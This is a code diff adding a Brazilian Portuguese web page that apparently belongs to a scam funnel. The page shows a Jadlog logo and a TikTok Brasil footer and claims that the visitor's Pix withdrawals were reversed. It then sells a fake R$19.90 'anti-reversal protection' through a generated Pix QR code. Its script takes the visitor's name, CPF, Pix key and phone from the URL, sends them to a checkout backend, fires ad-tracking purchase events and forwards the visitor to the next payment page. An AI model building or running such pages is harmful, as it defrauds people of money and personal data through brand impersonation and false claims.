@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+  window.pixelId = "69a64ea97bd1ecfa7e6be10c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Proteção Anti-Reversão Pix</title>
+  <script src="/js/fb-tracking.js"></script>
+  <style>
+    :root { --kwai-orange: #FE2C55; --kwai-dark: #181212; --kwai-light: #FFF5EF; --kwai-red: #FF3D00; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+    body { background: var(--kwai-light); color: var(--kwai-dark); line-height: 1.6; }
+    .navbar { display: flex; justify-content: space-between; align-items: center; background: #2865AE; padding: 15px 10px; }
+    .navbar .menu-icon img { height: 5vh; }
+    .container { max-width: 100%; padding: 15px; margin: 0 auto; }
+    .offer-container { background: #fff; border-radius: 12px; padding: 20px; margin: 20px auto; box-shadow: 0 5px 15px rgba(255,107,0,0.1); border: 1px solid rgba(255,107,0,0.2); max-width: 500px; }
+    .offer-title { color: var(--kwai-orange); font-size: 22px; font-weight: 700; margin-bottom: 15px; text-align: center; }
+    .offer-description { margin-bottom: 20px; font-size: 16px; }
+    .highlight { background: rgba(255,107,0,0.1); padding: 10px; border-radius: 8px; margin: 15px 0; border-left: 3px solid var(--kwai-orange); }
+    .benefits-list { list-style: none; margin: 15px 0; }
+    .benefits-list li { padding: 8px 0; padding-left: 30px; position: relative; }
+    .benefits-list li:before { content: "✓"; color: var(--kwai-orange); font-weight: bold; position: absolute; left: 0; }
+    .cta-button { background: linear-gradient(to right, var(--kwai-orange), #FE2C55); color: #fff; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 30px; width: 100%; cursor: pointer; margin: 20px 0; box-shadow: 0 4px 10px rgba(255,107,0,0.3); }
+    .cta-button:hover { transform: translateY(-2px); }
+    .up6-pix-box { display: none; margin-top: 1.5rem; padding: 1rem; background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 10px; text-align: center; }
+    .up6-pix-box.show { display: block; }
+    .up6-pix-code { font-size: 11px; word-break: break-all; max-height: 70px; overflow: auto; padding: 8px; background: #fff; border-radius: 8px; margin: 10px 0; border: 1px solid #e5e7eb; }
+    .up6-pix-actions { display: flex; gap: 8px; justify-content: center; margin-top: 8px; }
+    .up6-pix-actions button { padding: 10px 16px; border-radius: 8px; border: 1px solid #d1d5db; background: #f9fafb; font-weight: 600; cursor: pointer; }
+    .up6-timer { font-size: 12px; color: #4b5563; margin-top: 8px; }
+    .up6-status { margin-top: 8px; font-size: 12px; padding: 8px; border-radius: 8px; display: none; }
+    .up6-status.show { display: block; }
+    .up6-status.ok { background: #ecfdf3; color: #166534; }
+    .up6-status.error { background: #fef2f2; color: #b91c1c; }
+    .footer { text-align: center; font-size: 12px; color: #666; margin-top: 30px; padding: 15px; }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <div class="menu-icon">
+      <img src="images/logo-jadlog.png" alt="Logo" onerror="this.style.display='none'">
+    </div>
+    <div></div>
+    <div class="menu-icon" style="color:#fff;font-size:24px;">&#9776;</div>
+  </nav>
+
+  <div class="container">
+    <div class="offer-container">
+      <div style="text-align:center;font-size:30px;margin-bottom:15px;">🔒</div>
+      <h1 class="offer-title">Ativação de Proteção Anti-Reversão Pix</h1>
+      <div class="offer-description">
+        <div class="highlight" style="border-left-color: var(--kwai-red);">
+          <p>⚠️ <strong>Atenção:</strong> Saques recentes foram revertidos por falha bancária e divergência de chave Pix.</p>
+        </div>
+        <p>Ative agora a proteção anti-reversão e garanta que o valor seja entregue corretamente na sua conta.</p>
+        <ul class="benefits-list">
+          <li>Cobertura contra reversão automática</li>
+          <li>Proteção contra erro de chave</li>
+          <li>Prevenção de falhas bancárias</li>
+        </ul>
+      </div>
+
+      <button id="paymentButton" class="cta-button">✅ CONCLUIR COM SEGURANÇA</button>
+
+      <div id="up6PixBox" class="up6-pix-box">
+        <div id="up6Qrcode"></div>
+        <div id="up6PixCode" class="up6-pix-code">Aguardando código PIX...</div>
+        <div class="up6-pix-actions">
+          <button id="up6Copy">Copiar código</button>
+          <button id="up6Verify">Já paguei - Verificar</button>
+        </div>
+        <div class="up6-timer">Tempo restante: <span id="up6Timer">--:--</span></div>
+        <div id="up6Status" class="up6-status"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">© 2025 TikTok Brasil - Todos os direitos reservados</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
+  <script>
+    var API_CREATE = "../checkout/api/create-payment.php";
+    var API_CHECK = "../checkout/api/check-payment.php";
+    var SESSION_KEY = "up6CheckoutSessionId";
+    var POLL_INTERVAL_MS = 5000;
+    var POLL_MAX_MS = 10 * 60 * 1000;
+    var NEXT_URL = "../checkout/index.html";
+    var AMOUNT_CENTS = 1990;
+
+    var params = new URLSearchParams(window.location.search);
+    var nome = (params.get("nome") || "Cliente").trim();
+    var cpf = (params.get("cpf") || "").replace(/\D/g, "");
+    var pixKey = (params.get("chave_pix") || params.get("cpf") || cpf).trim();
+    var leadPhone = (params.get("phone") || params.get("telefone") || "").replace(/\D/g, "");
+
+    var sessionId = localStorage.getItem(SESSION_KEY) || "";
+    var pollTimer = null;
+    var pollStartedAt = 0;
+    var expiresAtRaw = null;
+
+    function buildContact() {
+      var normalizedCPF = cpf || "cliente";
+      var email = (normalizedCPF + "@email.com").replace(/[^\w@.\-]/g, "");
+      var phone = leadPhone.length >= 10 ? leadPhone : "11999999999";
+      return { email: email, phone: phone };
+    }
+
+    function showStatus(text, type) {
+      var el = document.getElementById("up6Status");
+      if (!el) return;
+      el.textContent = text;
+      el.className = "up6-status show " + (type || "");
+    }
+
+    function renderQR(pixCode) {
+      var qrEl = document.getElementById("up6Qrcode");
+      if (!qrEl) return;
+      qrEl.innerHTML = "";
+      new QRCode(qrEl, { text: pixCode, width: 220, height: 220, correctLevel: QRCode.CorrectLevel.M });
+    }
+
+    function createPayment() {
+      var btn = document.getElementById("paymentButton");
+      if (btn) btn.disabled = true;
+
+      var contact = buildContact();
+      var storedUtms = typeof getStoredUtms === "function" ? getStoredUtms() : {};
+      if (typeof getFbp === "function" && getFbp()) storedUtms.fbp = getFbp();
+
+      var payload = {
+        session_id: sessionId || undefined,
+        name: nome,
+        document: cpf,
+        phone: contact.phone,
+        email: contact.email,
+        amount_cents: AMOUNT_CENTS,
+        pix_key: pixKey,
+        flow: "up6",
+        tracking_parameters: storedUtms,
+        source_url: window.location.href
+      };
+
+      fetch(API_CREATE, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(function(r) { return r.json(); }).then(function(data) {
+        if (!data.ok) throw new Error(data.error || "Falha ao gerar PIX.");
+        sessionId = data.session_id;
+        localStorage.setItem(SESSION_KEY, sessionId);
+        expiresAtRaw = data.expires_at || null;
+
+        if (typeof fbTrack === "function") {
+          fbTrack("InitiateCheckout", {
+            currency: "BRL",
+            value: AMOUNT_CENTS / 100,
+            content_name: "PIX up6",
+            content_ids: [data.payment_code]
+          }, { browserOnly: true });
+        }
+
+        document.getElementById("up6PixBox").classList.add("show");
+        renderQR(data.pix_qrcode_text);
+        document.getElementById("up6PixCode").textContent = data.pix_qrcode_text;
+        showStatus("PIX gerado. Realize o pagamento para continuar.", "ok");
+        startPolling();
+      }).catch(function(err) {
+        showStatus(err.message || "Erro ao gerar PIX.", "error");
+      }).finally(function() {
+        if (btn) btn.disabled = false;
+      });
+    }
+
+    function checkPayment() {
+      if (!sessionId) return Promise.resolve(null);
+      return fetch(API_CHECK + "?session_id=" + encodeURIComponent(sessionId), { method: "GET", headers: { "Accept": "application/json" } })
+        .then(function(r) { return r.json(); })
+        .then(function(data) { return data.ok ? data : null; });
+    }
+
+    function onPaid() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+      if (typeof fbTrack === "function") {
+        fbTrack("Purchase", { currency: "BRL", value: AMOUNT_CENTS / 100, content_name: "PIX up6" });
+      }
+      window.location.href = NEXT_URL + window.location.search;
+    }
+
+    function startPolling() {
+      pollStartedAt = Date.now();
+      pollTimer = setInterval(function() {
+        if (Date.now() - pollStartedAt > POLL_MAX_MS) {
+          clearInterval(pollTimer);
+          pollTimer = null;
+          showStatus("Tempo esgotado. Clique em 'Já paguei - Verificar'.", "error");
+          return;
+        }
+        checkPayment().then(function(data) {
+          if (data && data.status === "paid") onPaid();
+        });
+      }, POLL_INTERVAL_MS);
+    }
+
+    function updateTimer() {
+      var label = document.getElementById("up6Timer");
+      if (!label || !expiresAtRaw) { if (label) label.textContent = "--:--"; return; }
+      var d = new Date(expiresAtRaw.replace(" ", "T"));
+      if (isNaN(d.getTime())) { label.textContent = "--:--"; return; }
+      var diff = Math.max(0, d.getTime() - Date.now());
+      label.textContent = String(Math.floor(diff / 60000)).padStart(2, "0") + ":" + String(Math.floor((diff % 60000) / 1000)).padStart(2, "0");
+    }
+
+    document.getElementById("paymentButton").addEventListener("click", createPayment);
+    document.getElementById("up6Copy").addEventListener("click", function() {
+      var code = document.getElementById("up6PixCode").textContent || "";
+      if (!code || code.indexOf("Aguardando") === 0) return;
+      navigator.clipboard.writeText(code).then(function() { showStatus("Código copiado.", "ok"); });
+    });
+    document.getElementById("up6Verify").addEventListener("click", function() {
+      showStatus("Verificando...", "");
+      checkPayment().then(function(data) {
+        if (data && data.status === "paid") onPaid();
+        else showStatus("Ainda pendente. Aguarde a confirmação.", "");
+      }).catch(function() { showStatus("Erro ao verificar.", "error"); });
+    });
+
+    if (sessionId) {
+      document.getElementById("up6PixBox").classList.add("show");
+      showStatus("Sessão restaurada. Verificando pagamento...", "");
+      startPolling();
+    }
+    setInterval(updateTimer, 1000);
+    updateTimer();
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+</body>
+</html>
